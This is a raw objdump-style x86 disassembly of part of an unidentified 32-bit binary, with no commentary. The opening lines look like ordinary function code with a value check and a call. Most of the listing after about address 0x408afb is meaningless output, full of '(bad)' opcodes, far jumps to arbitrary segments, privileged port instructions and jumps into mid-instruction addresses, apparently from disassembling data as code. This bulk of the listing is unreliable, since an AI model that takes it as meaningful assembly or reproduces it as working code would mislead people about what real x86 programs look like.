  408a6b:	or     DWORD PTR ds:0x426f29,ecx
  408a71:	mov    eax,DWORD PTR [ebp-0x2c]
  408a74:	mov    ecx,DWORD PTR [ebp+0x8]
  408a77:	add    ecx,DWORD PTR [eax+ebx*4]
  408a7a:	add    eax,DWORD PTR ds:0x426f11
  408a80:	mov    DWORD PTR [ebp-0x28],ecx
  408a83:	mov    eax,DWORD PTR [ebp-0x4]
  408a86:	mov    ecx,DWORD PTR [ebp-0x28]
  408a89:	xor    eax,esi
  408a8b:	add    eax,edi
  408a8d:	mov    DWORD PTR ds:0x426eb5,0x5328
  408a97:	cmp    ecx,eax
  408a99:	je     0x408ae1
  408a9f:	mov    DWORD PTR ds:0x426f0d,0x30c
  408aa9:	jmp    0x408ad2
  408aae:	mov    eax,DWORD PTR [ebp-0x4]
  408ab1:	mov    ecx,DWORD PTR [ebp-0x8]
  408ab4:	xor    eax,esi
  408ab6:	add    eax,edi
  408ab8:	cmp    ecx,eax
  408aba:	mov    eax,DWORD PTR [ebp-0x4]
  408abd:	je     0x40aed1
  408ac3:	mov    ecx,DWORD PTR [ebp-0x30]
  408ac6:	xor    eax,esi
  408ac8:	add    eax,edi
  408aca:	cmp    ecx,eax
  408acc:	je     0x40aeda
  408ad2:	lea    eax,[ebp-0x8]
  408ad5:	push   eax
  408ad6:	push   DWORD PTR [ebp-0x28]
  408ad9:	push   DWORD PTR [ebp+0xc]
  408adc:	call   0x411c13
  408ae1:	mov    eax,DWORD PTR [ebp-0x4]
  408ae4:	mov    ecx,DWORD PTR [ebp-0x8]
  408ae7:	xor    eax,esi
  408ae9:	add    eax,edi
  408aeb:	cmp    ecx,eax
  408aed:	je     0x40aebd
  408af3:	mov    eax,DWORD PTR [ebp-0x34]
  408af6:	jmp    0x40aeab
  408afb:	cwde   
  408afc:	mov    esi,0x78f950e9
  408b01:	cmp    BYTE PTR [esi+0x12],al
  408b04:	mov    ds:0x9af229ff,eax
  408b09:	loopne 0x408aea
  408b0b:	jmp    0x7b9c:0x137b7be5
  408b12:	jnp    0x408a9d
  408b14:	pop    ebx
  408b15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b16:	mov    WORD PTR [edi-0x37],es
  408b19:	aas    
  408b1a:	cdq    
  408b1b:	fcomp  QWORD PTR [edx+edx*4+0x2a0454ef]
  408b22:	pop    es
  408b23:	(bad)  
  408b24:	jle    0x408ad7
  408b26:	push   edx
  408b27:	stos   BYTE PTR es:[edi],al
  408b28:	scas   eax,DWORD PTR es:[edi]
  408b29:	cs fwait
  408b2b:	jl     0x408ab3
  408b2d:	xchg   ebp,eax
  408b2e:	stc    
  408b2f:	repz lock int 0xec
  408b33:	retf   0x27a
  408b36:	loop   0x408b51
  408b38:	lods   eax,DWORD PTR ds:[esi]
  408b39:	pop    ebp
  408b3a:	retf   
  408b3b:	nop
  408b3c:	rcr    bl,0x73
  408b3f:	push   ecx
  408b40:	sti    
  408b41:	call   0xf291:0x3caf7133
  408b48:	lods   al,BYTE PTR ds:[esi]
  408b49:	mov    al,es:0x3781c572
  408b4f:	jmp    0x408b85
  408b51:	push   eax
  408b52:	lods   al,BYTE PTR ds:[esi]
  408b53:	lods   eax,DWORD PTR ds:[esi]
  408b54:	push   cs
  408b55:	and    edx,0xffffffc5
  408b58:	test   DWORD PTR [edx+0x38f4b3d1],edx
  408b5e:	ja     0x408b76
  408b60:	retf   
  408b61:	out    0x4b,al
  408b63:	ds push edi
  408b65:	mov    bl,0xaf
  408b67:	stos   DWORD PTR es:[edi],eax
  408b68:	mov    ds:0x783d6038,al
  408b6d:	jge    0x408bc4
  408b6f:	and    al,0xd7
  408b71:	push   ecx
  408b72:	cmp    eax,0x1907dc5
  408b77:	xchg   edi,eax
  408b78:	enter  0x622e,0x56
  408b7c:	aas    
  408b7d:	and    ebx,DWORD PTR [esi+0x32]
  408b80:	push   ds
  408b81:	cdq    
  408b82:	inc    eax
  408b83:	mov    esp,0x94fa8031
  408b88:	xchg   esp,eax
  408b89:	outs   dx,DWORD PTR ds:[esi]
  408b8a:	mov    dl,0xf7
  408b8c:	and    edx,edx
  408b8e:	xor    BYTE PTR [edi+ebx*2+0x1],bl
  408b92:	adc    BYTE PTR [eax+0x4658294b],0x29
  408b99:	or     esi,ebp
  408b9b:	imul   esp,DWORD PTR [esi-0x46],0xffffff98
  408b9f:	pushf  
  408ba0:	xchg   esp,eax
  408ba1:	xchg   ebx,eax
  408ba2:	mov    ?,WORD PTR [si-0x101f]
  408ba7:	adc    BYTE PTR [edi+0x14742540],cl
  408bad:	imul   ecx,ecx,0xffffffd5
  408bb0:	pop    edx
  408bb1:	adc    eax,0xf9430aff
  408bb6:	jg     0x408b40
  408bb8:	sar    BYTE PTR [ebx-0x5441d2b0],0x25
  408bbf:	xor    esi,DWORD PTR [edi]
  408bc1:	sub    eax,0xb5fce38f
  408bc6:	retf   0xf8c9
  408bc9:	repz push edx
  408bcb:	inc    esp
  408bcc:	dec    edi
  408bcd:	mov    WORD PTR [eax],ss
  408bcf:	push   ecx
  408bd0:	xchg   edx,eax
  408bd1:	(bad)  
  408bd2:	pop    ebp
  408bd3:	(bad)  
  408bd4:	loopne 0x408c35
  408bd6:	test   al,0x6f
  408bd8:	add    DWORD PTR [esp+edx*8+0x1ef84560],ecx
  408bdf:	and    al,0x59
  408be1:	push   es
  408be2:	xchg   ecx,eax
  408be3:	out    0xaf,eax
  408be5:	shr    BYTE PTR [eax-0x3d7a549e],0x3f
  408bec:	mov    ebx,0x2761f627
  408bf1:	xchg   ecx,eax
  408bf2:	xor    ebp,DWORD PTR [ecx+0x3cd86042]
  408bf8:	cmp    eax,0x595acd22
  408bfd:	inc    eax
  408bfe:	imul   edx,eax,0xd
  408c01:	mov    ds:0x9de827f5,al
  408c06:	push   esp
  408c07:	stc    
  408c08:	xchg   ecx,eax
  408c09:	xor    edi,DWORD PTR [ebp-0x18e98c83]
  408c0f:	mov    ds:0xb7259c90,eax
  408c14:	mov    ebx,0xb8e86723
  408c19:	add    DWORD PTR [edx],ebx
  408c1b:	cmp    ecx,DWORD PTR [edx]
  408c1d:	and    BYTE PTR [ecx-0x24],dl
  408c20:	(bad)  
  408c21:	fisub  WORD PTR [ecx]
  408c23:	cwde   
  408c24:	xor    eax,0x7609d0a5
  408c29:	sub    BYTE PTR [edi-0x5d501fd4],0x95
  408c30:	out    dx,al
  408c31:	sbb    al,0x58
  408c33:	jg     0x408caf
  408c35:	sbb    eax,0xfd6a1185
  408c3a:	imul   edx
  408c3c:	sbb    BYTE PTR [ecx+0x74],0xb2
  408c40:	(bad)  
  408c41:	xchg   edx,eax
  408c42:	and    al,0xa4
  408c44:	mov    esp,0x2d1abc8a
  408c49:	dec    ebp
  408c4a:	add    esi,DWORD PTR [eax+0x5e]
  408c4d:	inc    ebx
  408c4e:	in     al,dx
  408c4f:	push   edi
  408c50:	stos   DWORD PTR es:[edi],eax
  408c51:	and    BYTE PTR [edi],al
  408c53:	jae    0x408c51
  408c55:	or     ebx,DWORD PTR [ebx]
  408c57:	add    esi,DWORD PTR [esi-0x6e]
  408c5a:	xchg   ecx,eax
  408c5b:	in     eax,0x18
  408c5d:	adc    ah,bl
  408c5f:	mov    eax,0x595c50ec
  408c64:	cmc    
  408c65:	clc    
  408c66:	in     ax,dx
  408c68:	les    eax,FWORD PTR [eax+0x1e]
  408c6b:	lock dec ebp
  408c6d:	add    al,0x7c
  408c6f:	mov    ecx,0x9561b51d
  408c74:	add    DWORD PTR [ebx],ebp
  408c76:	enter  0x3b2,0x36
  408c7a:	add    DWORD PTR [esi+0x74],ebx
  408c7d:	stos   DWORD PTR es:[edi],eax
  408c7e:	in     eax,0x20
  408c80:	cmp    bl,BYTE PTR [esp+ebx*2-0x7caa8184]
  408c87:	nop
  408c88:	push   ss
  408c89:	inc    eax
  408c8a:	pop    eax
  408c8b:	js     0x408c6b
  408c8d:	test   BYTE PTR [edi+0x6c],dh
  408c90:	inc    edx
  408c91:	lds    eax,FWORD PTR [esi+0x4]
  408c94:	push   ss
  408c95:	fdivp  st(7),st
  408c97:	mov    ebx,DWORD PTR [ebx+0x385a239]
  408c9d:	loopne 0x408ce2
  408c9f:	int3   
  408ca0:	mov    cl,0xed
  408ca2:	push   cs
  408ca3:	push   es
  408ca4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ca5:	lods   al,BYTE PTR ds:[esi]
  408ca6:	xor    bh,ch
  408ca8:	pop    ecx
  408ca9:	sbb    DWORD PTR [edx],ecx
  408cab:	xchg   esi,eax
  408cac:	adc    eax,0x56004f30
  408cb1:	pop    esi
  408cb2:	cmp    eax,0x94f3239
  408cb7:	sar    DWORD PTR [ebp+esi*8-0x2f5cc022],1
  408cbe:	fcmove st,st(7)
  408cc0:	push   ds
  408cc1:	es ror cl,cl
  408cc4:	add    al,0xca
  408cc6:	pop    esi
  408cc7:	fwait
  408cc8:	inc    eax
  408cc9:	pop    esi
  408cca:	mov    WORD PTR [edx],fs
  408ccc:	loopne 0x408ceb
  408cce:	mov    esp,cs
  408cd0:	ret    0x5338
  408cd3:	(bad)
  408cd7:	repnz sbb DWORD PTR [ecx],ebp
  408cda:	aam    0x6d
  408cdc:	inc    esp
  408cdd:	push   0x69
  408cdf:	adc    DWORD PTR [eax+edi*8],0x20
  408ce3:	jno    0x408d4a
  408ce5:	cmc    
  408ce6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ce7:	leave  
  408ce8:	push   cs
  408ce9:	cmp    eax,0x72937b0d
  408cee:	ds jne 0x408d0c
  408cf1:	call   0x478f684a
  408cf6:	imul   eax,DWORD PTR ds:0x2c600c18,0xfffffffc
  408cfd:	mov    ecx,0xd895d846
  408d02:	cmp    al,0x4f
  408d04:	cld    
  408d05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d06:	stos   BYTE PTR es:[edi],al
  408d07:	(bad)  
  408d08:	popa   
  408d09:	fldenv [ebp+0x2f]
  408d0c:	retf   0x6832
  408d0f:	xor    esp,DWORD PTR ds:0xee27f2b9
  408d15:	pop    ds
  408d16:	sbb    al,0x95
  408d18:	imul   eax,ecx,0x25ed1a9b
  408d1e:	jmp    0xbcfe:0xf0f8
  408d24:	inc    esp
  408d25:	pop    edi
  408d26:	iret   
  408d27:	hlt    
  408d28:	aad    0x98
  408d2a:	repz add al,0x47
  408d2d:	and    al,0x6a
  408d2f:	jl     0x408d91
  408d31:	sbb    edx,esp
  408d33:	mov    ah,cl
  408d35:	or     BYTE PTR [ecx],cl
  408d37:	mov    ds:0x7bc7b06b,al
  408d3c:	dec    esp
  408d3d:	cli    
  408d3e:	scas   eax,DWORD PTR es:[edi]
  408d3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d40:	les    eax,FWORD PTR [eax-0x7a4b37a1]
  408d46:	shr    cl,1
  408d48:	adc    dh,BYTE PTR [esi+0x4f4f297d]
  408d4e:	leave  
  408d4f:	(bad)  
  408d50:	mov    ch,0x2c
  408d52:	sti    
  408d53:	and    al,0x49
  408d55:	jnp    0x408cdc
  408d57:	mov    ebx,0x65945e64
  408d5c:	push   cs
  408d5d:	out    0x37,eax
  408d5f:	nop
  408d60:	mov    ecx,0x75c8fbae
  408d65:	mov    eax,0xd3287a60
  408d6a:	data16 (bad) 
  408d6c:	sbb    DWORD PTR [ecx-0x6149a31d],edi
  408d72:	fisttp DWORD PTR [ecx]
  408d74:	scas   eax,DWORD PTR es:[edi]
  408d75:	mov    ch,0xa2
  408d77:	jo     0x408d1a
  408d79:	dec    eax
  408d7a:	jl     0x408dbc
  408d7c:	mov    DWORD PTR fs:[ebx-0x53],esi
  408d80:	imul   eax,DWORD PTR [eax],0x488b4040
  408d86:	cs mov ecx,0x8c97624a
  408d8c:	jns    0x408d53
  408d8e:	sahf   
  408d8f:	stc    
  408d90:	fld    DWORD PTR [ebx+0x5f2fec2b]
  408d96:	bound  edi,QWORD PTR [edi+edx*8]
  408d99:	ins    DWORD PTR es:[edi],dx
  408d9a:	ds sahf 
  408d9c:	adc    eax,0x4a5f2061
  408da1:	std    
  408da2:	inc    esp
  408da3:	repz mov esp,es
  408da6:	adc    DWORD PTR [edx-0xf],edi
  408da9:	add    eax,0x706d93e8
  408dae:	mov    WORD PTR [edi+0xce4e699],gs
  408db4:	ins    DWORD PTR es:[edi],dx
  408db5:	pop    ecx
  408db6:	aad    0x62
  408db8:	mov    dh,0x8d
  408dba:	bswap  esi
  408dbc:	add    BYTE PTR [edx+0x5ab7dc0f],dl
  408dc2:	mov    DWORD PTR [eax],esi
  408dc4:	test   DWORD PTR [edx],edx
  408dc6:	mov    esi,0x7e31ee61
  408dcb:	fdiv   QWORD PTR [ebx+0x6dbf535c]
  408dd1:	mov    esi,0x7f6ef91
  408dd6:	lods   eax,DWORD PTR ds:[esi]
  408dd7:	outs   dx,BYTE PTR ds:[esi]
  408dd8:	mov    esp,0x92ebd577
  408ddd:	ss and bh,ah
  408de0:	mov    BYTE PTR [esi],al
  408de2:	cmp    eax,0x71572c7c
  408de7:	push   eax
  408de8:	gs std 
  408dea:	and    eax,0x1f5fdfe6
  408def:	or     al,0x42
  408df1:	push   esi
  408df2:	xchg   edi,eax
  408df3:	cmc    
  408df4:	retf   0x51af
  408df7:	fwait
  408df8:	jl     0x408e16
  408dfa:	shl    BYTE PTR [eax+0xc],1
  408dfd:	mov    DWORD PTR ds:0x1eea2f7,ebp
  408e03:	popa   
  408e04:	jo     0x408dd9
  408e06:	pop    edi
  408e07:	cmp    ax,0x2537
  408e0b:	imul   eax,DWORD PTR [esi+0x30],0xfffffff0
  408e0f:	cld    
  408e10:	mov    gs,WORD PTR [edx+edi*8]
  408e13:	popf   
  408e14:	in     eax,dx
  408e15:	out    dx,eax
  408e16:	cwde   
  408e17:	push   es
  408e18:	jae    0x408dae
  408e1a:	ror    esi,1
  408e1c:	enter  0x50b9,0x8d
  408e20:	hlt    
  408e21:	jle    0x408dd6
  408e23:	push   eax
  408e24:	push   cs
  408e25:	mov    eax,ds:0x86a79bec
  408e2a:	cmp    DWORD PTR [ebx],esi
  408e2c:	xchg   ebp,eax
  408e2d:	adc    BYTE PTR [eax-0x51],bh
  408e30:	push   es
  408e31:	loopne 0x408e74
  408e33:	loopne 0x408eb3
  408e35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e36:	adc    al,cl
  408e38:	cmp    edx,DWORD PTR [edi]
  408e3a:	xchg   edx,eax
  408e3b:	push   0x97a2010c
  408e40:	push   esi
  408e41:	cmc    
  408e42:	jg     0x408de4
  408e44:	mov    eax,0x737199cb
  408e49:	mov    ?,WORD PTR [edi-0x80]
  408e4c:	add    ah,cl
  408e4e:	push   eax
  408e4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e50:	sahf   
  408e51:	mov    bh,0x24
  408e53:	jl     0x408ecd
  408e55:	int    0xe
  408e57:	loopne 0x408e64
  408e59:	call   0xf1a3:0x23542ac5
  408e60:	ret    
  408e61:	and    ah,BYTE PTR [edi+edi*2-0x2d]
  408e65:	stos   BYTE PTR es:[edi],al
  408e66:	xor    ebx,DWORD PTR [edi-0x4a9a8e2c]
  408e6c:	or     al,0xab
  408e6e:	add    DWORD PTR ds:0x37c86c0b,0x79
  408e75:	push   0xfa180369
  408e7a:	xchg   al,bh
  408e7c:	push   edi
  408e7d:	cld    
  408e7e:	jnp    0x408e94
  408e80:	cdq    
  408e81:	gs pop ds
  408e83:	inc    ebp
  408e84:	adc    BYTE PTR [edi+0x1e],0x85
  408e88:	outs   dx,DWORD PTR ds:[esi]
  408e89:	popa   
  408e8a:	and    edx,edx
  408e8c:	call   0xced61ec3
  408e91:	jno    0x408e5b
  408e93:	push   edi
  408e94:	movq   mm2,mm4
  408e97:	xor    cl,ah
  408e99:	in     al,0x98
  408e9b:	mov    ds:0x91ae5ca3,eax
  408ea0:	cmp    DWORD PTR [ebx],ebx
  408ea2:	add    BYTE PTR [edi-0xe],dh
  408ea5:	fisubr WORD PTR [esi+0x445495b7]
  408eab:	aad    0x81
  408ead:	sbb    DWORD PTR [ebp+0x4c],ebx
  408eb0:	or     ah,BYTE PTR [ebp+0x1e]
  408eb3:	pushf  
  408eb4:	mov    WORD PTR [edx+0x0],fs
  408eb7:	xchg   esi,eax
  408eb8:	jmp    0x59e2:0xfff06248
  408ebf:	stos   BYTE PTR es:[edi],al
  408ec0:	adc    eax,0xdcf3b6a2
  408ec5:	jnp    0x408f2d
  408ec7:	mov    bl,0xce
  408ec9:	add    ebp,esi
  408ecb:	jle    0x408ee2
  408ecd:	fldcw  WORD PTR [edx-0x79db3be4]
  408ed3:	adc    DWORD PTR [edx-0x3cf662a8],0x59
  408eda:	out    dx,al
  408edb:	cdq    
  408edc:	and    edi,esp
  408ede:	xor    dl,0xd6
  408ee1:	hlt    
  408ee2:	fsubr  QWORD PTR [eax+ebp*1-0x54a95fbb]
  408ee9:	mov    edi,0x3629b74c
  408eee:	mov    ds:0x16f4b0e4,al
  408ef3:	pop    esi
  408ef4:	(bad)  
  408ef5:	and    edx,DWORD PTR [ecx]
  408ef7:	out    0x60,eax
  408ef9:	cmp    ah,BYTE PTR [edi+esi*2-0x4495bef]
  408f00:	jmp    0xdf67:0xa225033c
  408f07:	adc    BYTE PTR [ecx],dl
  408f09:	std    
  408f0a:	lds    ecx,FWORD PTR [esi+0x49ddac1e]
  408f10:	xchg   ebp,eax
  408f11:	sbb    al,BYTE PTR [eax]
  408f13:	sbb    al,ah
  408f15:	test   eax,0x9b5e636b
  408f1a:	stos   BYTE PTR es:[edi],al
  408f1b:	aaa    
  408f1c:	mov    al,0x98
  408f1e:	xor    DWORD PTR [ebp-0x753892ac],0x8bc68cbc
  408f28:	adc    al,BYTE PTR [edi-0x33]
  408f2b:	jmp    0x408eed
  408f2d:	push   ebx
  408f2e:	dec    eax
  408f2f:	mov    al,ds:0x9026a2d1
  408f34:	mov    bl,BYTE PTR [ecx-0x63bfe8ac]
  408f3a:	fwait
  408f3b:	push   edi
  408f3c:	adc    ah,ah
  408f3e:	je     0x408f29
  408f40:	jbe    0x408ee7
  408f42:	das    
  408f43:	push   ebp
  408f44:	xor    BYTE PTR [ecx],al
  408f46:	mov    ah,0xac
  408f48:	push   esi
  408f49:	pop    ds
  408f4a:	jbe    0x408f59
  408f4c:	adc    edi,esi
  408f4e:	pop    ecx
  408f4f:	ud1    edi,eax
  408f52:	push   esi
  408f53:	stos   DWORD PTR es:[edi],eax
  408f54:	jl     0x408ede
  408f56:	icebp  
  408f57:	or     ebx,esp
  408f59:	popf   
  408f5a:	(bad)  
  408f5b:	int    0x81
  408f5d:	in     al,0x42
  408f5f:	daa    
  408f60:	xchg   esp,edx
  408f62:	mov    esp,edx
  408f64:	call   0x95bd9240
  408f69:	jmp    0x408f77
  408f6b:	fmul   QWORD PTR [ebx]
  408f6d:	mov    eax,ds:0xcce050d3
  408f72:	dec    eax
  408f73:	sbb    al,0x84
  408f75:	mov    ah,0x56
  408f77:	les    edx,FWORD PTR [edi-0x2068bfc4]
  408f7d:	pop    ebp
  408f7e:	dec    edx
  408f7f:	scas   al,BYTE PTR es:[edi]
  408f80:	mov    edx,0x74e38ebf
  408f85:	xor    al,0x5c
  408f87:	inc    ebp
  408f88:	sbb    bl,dl
  408f8a:	daa    
  408f8b:	cmp    al,0xab
  408f8d:	(bad)  
  408f8e:	rol    BYTE PTR [esi],cl
  408f90:	or     BYTE PTR [esi+esi*4],al
  408f93:	mov    bh,0x6b
  408f95:	mov    ds:0x3e5d0a,al
  408f9a:	add    al,0x6b
  408f9c:	push   0x2f
  408f9e:	popa   
  408f9f:	int3   
  408fa0:	and    eax,0xec4d599d
  408fa5:	mov    bh,0x36
  408fa7:	inc    esi
  408fa8:	sbb    al,0xa8
  408faa:	pop    eax
  408fab:	inc    eax
  408fac:	sbb    eax,0xbcb4ba9c
  408fb1:	mov    edx,0xf7bfb808
  408fb6:	add    bl,BYTE PTR [ebp+0x4349d71f]
  408fbc:	sbb    esp,ecx
  408fbe:	in     al,0xa5
  408fc0:	aas    
  408fc1:	adc    DWORD PTR [ebx-0x522e5c78],esp
  408fc7:	jae    0x408f56
  408fc9:	int3   
  408fca:	jnp    0x408f84
  408fcc:	fadd   DWORD PTR [ebx-0x1b378698]
  408fd2:	push   ecx
  408fd3:	xor    ebx,DWORD PTR [ecx-0x25]
  408fd6:	push   ebp
  408fd8:	jge    0x409059
  408fda:	lds    esi,FWORD PTR [ebx+0x6f3fe779]
  408fe0:	and    eax,0xa6bab475
  408fe5:	dec    edx
  408fe6:	ret    0xbb19
  408fe9:	ins    DWORD PTR es:[edi],dx
  408fea:	cmp    eax,0xa7ca121
  408fef:	and    eax,0xe69e4f96
  408ff4:	or     edi,DWORD PTR [ebx-0x64a68855]
  408ffa:	jmp    0xce2376a7
  408fff:	test   BYTE PTR [eax+0x60],bh
  409002:	mov    edi,0xc8742c4d
  409007:	push   es
  409008:	pop    eax
  409009:	out    dx,al
  40900a:	sbb    BYTE PTR [eax],dh
  40900c:	pop    es
  40900d:	mov    edx,0x3fae2afa
  409012:	xchg   ecx,eax
  409013:	adc    al,0x6e
  409015:	cli    
  409016:	sahf   
  409017:	lock test eax,0xa6a510c2
  40901d:	fdivr  DWORD PTR [edi]
  40901f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409020:	(bad)  
  409021:	jmp    0x8f59:0x8ee1175c
  409028:	adc    al,0xc9
  40902a:	es sti 
  40902c:	sbb    ebp,DWORD PTR [eax-0x7f]
  40902f:	popa   
  409030:	fs scas eax,DWORD PTR es:[edi]
  409032:	xchg   BYTE PTR [ecx],bl
  409034:	cdq    
  409035:	neg    DWORD PTR [ecx-0x7c]
  409038:	push   eax
  409039:	test   DWORD PTR [ecx+0xc],edx
  40903c:	adc    ebx,DWORD PTR [esp+eax*2-0x7f]
  409040:	mov    cl,0xfd
  409042:	adc    ch,BYTE PTR [edx-0x52dcd7d1]
  409048:	outs   dx,DWORD PTR ds:[esi]
  409049:	je     0x4090c5
  40904b:	mov    eax,ss
  40904d:	jg     0x409098
  40904f:	loopne 0x409030
  409051:	lahf   
  409052:	pop    ebx
  409053:	imul   edx,DWORD PTR [eax-0x5839323c],0xc317f354
  40905d:	xchg   BYTE PTR [esi],al
  40905f:	cs pop eax
  409061:	push   esi
  409062:	scas   eax,DWORD PTR es:[edi]
  409063:	inc    edi
  409064:	dec    edx
  409065:	leave  
  409066:	jbe    0x409038
  409068:	sub    cl,bl
  40906a:	test   DWORD PTR [ebp+0x64],esp
  40906d:	push   ss
  40906e:	into   
  40906f:	jnp    0x40907f
  409071:	fstp   DWORD PTR [esi-0x68a0bafa]
  409077:	xor    eax,0x18be969
  40907c:	adc    eax,0x1b55d8a2
  409081:	inc    ebx
  409082:	xlat   BYTE PTR ds:[ebx]
  409083:	cmp    esi,eax
  409085:	cs shl dl,cl
  409088:	add    cl,BYTE PTR [edx]
  40908a:	into   
  40908b:	mov    dl,0xbe
  40908d:	(bad)  
  40908e:	ss ret 
  409090:	pop    ss
  409091:	push   eax
  409092:	xor    al,0x34
  409094:	ds xchg edi,eax
  409096:	pop    ecx
  409097:	ret    0xef6c
  40909a:	cmp    ecx,DWORD PTR [ecx]
  40909c:	mov    cl,0x20
  40909e:	sbb    al,0xd9
  4090a0:	lods   al,BYTE PTR ds:[esi]
  4090a1:	test   BYTE PTR [esi+0x6c7992bb],dh
  4090a7:	(bad)  
  4090a8:	call   0xd3cf6fca
  4090ad:	sbb    eax,0xae1c6bb8
  4090b2:	push   ebp
  4090b3:	cmc    
  4090b4:	push   ebp
  4090b5:	jp     0x40912b
  4090b7:	cmp    DWORD PTR [ecx],0xffffffa5
  4090ba:	fst    st(3)
  4090bc:	sub    BYTE PTR [esi-0x75],ch
  4090bf:	das    
  4090c0:	popf   
  4090c1:	mov    esp,0x63416d6f
  4090c6:	js     0x4090f5
  4090c8:	cmp    BYTE PTR [edx],dh
  4090ca:	test   eax,0x78697770
  4090cf:	sub    eax,0xc52af1da
  4090d4:	inc    esi
  4090d5:	dec    ecx
  4090d6:	outs   dx,DWORD PTR ds:[esi]
  4090d7:	out    dx,al
  4090d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090d9:	(bad)  
  4090db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090dc:	push   0x50f3e0a8
  4090e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090e2:	pop    ecx
  4090e3:	push   eax
  4090e4:	cmp    ebx,DWORD PTR [ebx]
  4090e6:	and    al,0x4c
  4090e8:	popf   
  4090e9:	call   0x7ee8848a
  4090ee:	mov    DWORD PTR ds:0x5c7540f3,ebp
  4090f4:	in     al,0x96
  4090f6:	pop    edi
  4090f7:	out    0xe2,eax
  4090f9:	hlt    
  4090fa:	aas    
  4090fb:	enter  0xaaf3,0x43
  4090ff:	lods   al,BYTE PTR ds:[esi]
  409100:	mov    DWORD PTR [edi+eax*8-0x2f90227b],esi
  409107:	popa   
  409108:	xchg   edi,eax
  409109:	mov    WORD PTR [esi],ss
  40910b:	lea    esp,[ebx]
  40910d:	sbb    cl,BYTE PTR [ebx]
  40910f:	sar    ah,1
  409111:	ficom  WORD PTR [edx+0x11]
  409114:	cmp    BYTE PTR es:[edx],dl
  409117:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409118:	outs   dx,BYTE PTR ds:[esi]
  409119:	sbb    BYTE PTR [ecx],dl
  40911b:	and    dh,BYTE PTR [ebx+0x558c18d9]
  409121:	shl    BYTE PTR [ebp+0x1b4354c3],cl
  409127:	jmp    0x409115
  409129:	dec    esi
  40912a:	jecxz  0x409146
  40912c:	ror    DWORD PTR [eax-0x1f],0xb0
  409130:	push   esp
  409131:	mov    edx,0x4414772c
  409136:	xchg   ebx,esi
  409138:	mov    dh,0xd5
  40913a:	arpl   ax,di
  40913c:	jecxz  0x4091a3
  40913e:	(bad)  
  40913f:	fmul   QWORD PTR [ebp-0xa]
  409142:	sub    DWORD PTR [ebx+0x53],ebp
  409145:	mov    bl,BYTE PTR [edx+0x4e]
  409148:	rcr    DWORD PTR [edi-0x50],0x5b
  40914c:	ss sahf 
  40914e:	pop    ebx
  40914f:	or     eax,0x77c55336
  409154:	push   edi
  409155:	xor    cl,BYTE PTR [edi+0x1e4074ff]
  40915b:	mov    al,ds:0x20b0be24
  409160:	cmp    al,0x2
  409162:	ret    0x3e2f
  409165:	out    0xf0,eax
  409167:	push   ax
  409169:	inc    esp
  40916a:	xchg   ecx,eax
  40916b:	gs repnz stos BYTE PTR es:[edi],al
  40916e:	mov    ds:0x75f589c1,al
  409173:	mov    eax,ds:0x6c4c44ca
  409178:	out    0x69,eax
  40917a:	jno    0x4091dd
  40917c:	sbb    BYTE PTR [eax],ah
  40917e:	mov    edi,DWORD PTR gs:[eax]
  409181:	and    al,0x20
  409183:	mov    esp,0xd8c011fd
  409188:	into   
  409189:	neg    bh
  40918b:	dec    esi
  40918c:	stos   BYTE PTR es:[edi],al
  40918d:	push   0x41d1284c
  409192:	mov    edx,0xb04b072b
  409197:	mov    al,0xb9
  409199:	arpl   WORD PTR [esi+0x4e],bx
  40919c:	jge    0x4091f8
  40919e:	pushf  
  40919f:	sub    ebp,DWORD PTR [ecx+0x38]
  4091a2:	push   ds
  4091a3:	jno    0x4091f3
  4091a5:	dec    ebx
  4091a6:	jae    0x4091a2
  4091a8:	adc    eax,0x3db73138
  4091ad:	pop    ebx
  4091ae:	out    dx,eax
  4091af:	ret    0x1408
  4091b2:	jno    0x409164
  4091b4:	ficom  WORD PTR [esi]
  4091b6:	in     al,dx
  4091b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091b8:	mov    ds:0xbb1242b4,eax
  4091bd:	sub    BYTE PTR [eax+ebx*1],ch
  4091c0:	jmp    FWORD PTR [esi+0x317fab54]
  4091c6:	jl     0x4091d3
  4091c8:	xor    edi,DWORD PTR [ebp+0x70d33643]
  4091ce:	jecxz  0x40918c
  4091d0:	push   edx
  4091d1:	push   0xffffffa4
  4091d3:	cmc    
  4091d4:	push   esp
  4091d5:	sub    esi,esi
  4091d7:	mov    ecx,0x901782c3
  4091dc:	dec    eax
  4091dd:	ret    
  4091de:	in     al,0x2f
  4091e0:	mov    ds:0xb624d564,al
  4091e5:	mov    dl,0x55
  4091e7:	xchg   DWORD PTR [ebp+0x8f29a2e],ebx
  4091ed:	push   ebp
  4091ee:	lock das 
  4091f0:	mov    edi,0xa84efc98
  4091f5:	test   DWORD PTR es:[ebp+0x2d175661],ecx
  4091fc:	push   cs
  4091fd:	test   BYTE PTR [edx-0x6965d1cc],cl
  409203:	retf   0x90c7
  409206:	lea    ebx,[ebp-0x3ef2c4f3]
  40920c:	mov    dh,0x2c
  40920e:	cmp    BYTE PTR [edx-0x280cda68],ch
  409214:	xor    bh,cl
  409216:	cmp    BYTE PTR [ebp+0x4c80fd22],bh
  40921c:	out    0x43,al
  40921e:	test   al,0xa0
  409220:	cmc    
  409221:	aas    
  409222:	daa    
  409223:	lahf   
  409224:	xor    al,0x7b
  409226:	xchg   ecx,eax
  409227:	test   eax,0xd2d5ebbf
  40922c:	push   0x5f
  40922e:	scas   al,BYTE PTR es:[edi]
  40922f:	mov    bh,0xc8
  409231:	rcr    DWORD PTR [ecx+0x22],1
  409234:	jmp    0x3b70:0xcd20850d
  40923b:	push   ebp
  40923c:	(bad)  
  40923d:	cmp    BYTE PTR [eax+0x1e],dh
  409240:	and    ecx,DWORD PTR [ecx+0x2c]
  409243:	mov    ebx,0xad49f318
  409248:	call   0xcad2d304
  40924d:	adc    DWORD PTR [edi+eiz*1],0xa
